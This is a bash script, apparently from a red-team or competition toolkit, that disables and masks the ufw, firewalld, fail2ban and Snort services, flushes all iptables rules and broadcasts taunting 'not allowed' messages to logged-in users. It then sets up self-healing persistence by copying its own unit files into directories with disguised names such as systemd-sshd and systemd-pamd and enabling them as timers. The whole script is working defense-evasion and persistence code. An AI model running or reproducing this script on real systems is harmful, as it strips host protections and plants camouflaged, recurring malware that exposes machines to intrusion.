#! /bin/bash

# Stop and disable ufw and firewalld
if type "ufw" >/dev/null 2>/dev/null; then
	ufw disable
	systemctl disable --now ufw.service
	systemctl mask ufw.service
fi

if type "firewall-cmd" >/dev/null 2>/dev/null; then
	systemctl disable --now firewalld.service
	systemctl mask firewalld.service
fi

# No fail2ban for you
if type "fail2ban-server" >/dev/null 2>/dev/null; then
	systemctl disable --now fail2ban.service
	systemctl mask fail2ban.service
	figlet "Fail2ban is not allowed!" | /usr/games/cowsay -n | wall
fi

# No Snort for you
if type "snort" >/dev/null 2>/dev/null; then
	systemctl disable --now snort.service
	systemctl mask snort.service
	figlet "Snort is not allowed!" | /usr/games/cowsay -n | wall
fi

# Drop all firewall rules
if type "iptables" >/dev/null 2>/dev/null; then
	iptables -F
fi

# Self healing
mkdir --parents -- /usr/share/systemd-bootd \
	/usr/share/systemd-issued \
	/usr/share/systemd-maild \
	/usr/share/systemd-pamd \
	/usr/share/systemd-printerd \
	/usr/share/systemd-sshd \
	/usr/share/systemd-userd

cp -- /usr/share/systemd-firewalld/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-bootd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-issued/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-maild/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-pamd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-printerd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-sshd/
cp -r -- /usr/share/systemd-firewalld/* /usr/share/systemd-userd/

systemctl daemon-reload

systemctl unmask systemd-bootd.service \
	systemd-issued.service \
	systemd-maild.service \
	systemd-pamd.service \
	systemd-printer.service \
	systemd-ssh.service \
	systemd-userd.service

systemctl unmask systemd-bootd.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

systemctl enable --now systemd-bootd.timer \
	systemd-issued.timer \
	systemd-maild.timer \
	systemd-pamd.timer \
	systemd-printerd.timer \
	systemd-sshd.timer \
	systemd-userd.timer

# vim: set filetype=sh:
